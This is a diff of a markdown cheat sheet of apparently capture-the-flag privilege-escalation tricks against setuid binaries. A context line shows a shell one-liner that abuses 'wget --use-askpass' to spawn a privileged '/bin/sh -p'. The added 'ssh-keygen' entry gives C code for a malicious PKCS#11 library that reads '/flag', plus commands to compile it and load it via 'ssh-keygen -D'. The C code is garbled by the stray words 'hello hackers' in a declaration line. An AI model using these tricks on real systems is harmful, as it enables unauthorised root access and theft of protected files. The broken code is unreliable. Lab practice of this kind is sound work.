@@ -371,3 +371,23 @@ F=$(mktemp) && chmod +x $F && echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$F && wge
 Crafts a temporary shell script and abuses **`wget --use-askpass`**.
 
 
+## ssh-keygen
+
+```c
+#include <stdio.h>
+
+void C_GetFunctionList(void) {
+    FILE *fp = fopen("/flag", "r");
+
+    char buffer[256];hello hackers
+    while (fgets(buffer, sizeof(buffer), fp)) {
+        fputs(buffer, stdout);
+    }
+}
+```
+
+```bash
+gcc -fPIC -shared -o lib.so solve.c
+/challenge/ssh-keygen -D lib.so
+```
+
